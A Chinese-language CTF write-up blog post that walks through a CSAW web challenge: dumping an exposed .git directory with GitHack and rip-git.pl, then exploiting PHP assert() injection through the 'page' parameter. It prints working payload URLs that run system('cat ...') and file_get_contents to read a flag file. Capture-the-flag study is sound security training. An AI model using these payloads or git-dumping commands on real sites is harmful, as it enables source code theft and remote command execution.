---
title: 关于Git/config.泄露的小结 及 assert()函数注入初探
date: 2016-10-26 04:50:03
categories: CTF
tags: 
- git
- web
---

## 0x00 写在前面
晚上Ifuryst发了个web题链接玩玩http://web.chal.csaw.io:8000/

浏览了一下发现了简直是直钩，**你好我知道有猫腻。git泄漏！**
## 0x01 GitHack
GitHack.py https://github.com/lijiejie/GitHack

```
python GitHack.py URL/.git
```

检测到了相关目录并下载源码到我的本地。
flag.php的源码没啥东西…


<!--more-->
## 0x02 assert()注入
打开了``index.php``,看到了很多以``assert()``函数，通过Ifuryst点播，知道存在``assert()注入``。
用“||”进行屏蔽前面的内容，之后在输入

```
http://web.chal.csaw.io:8000/?page=NIKO || print(file_get_contents("templates/flag.php"));//

http://web.chal.csaw.io:8000/?page=NIKO) || system("cat templates/flag.php ");//
```

## 0x03 rip-git.pl
除了GitHack之外，基于Perl写的rip-git也很好用。

获得页面源码：

```
perl rip-git.pl -v -u http://web.chal.csaw.io:8000/.git
```
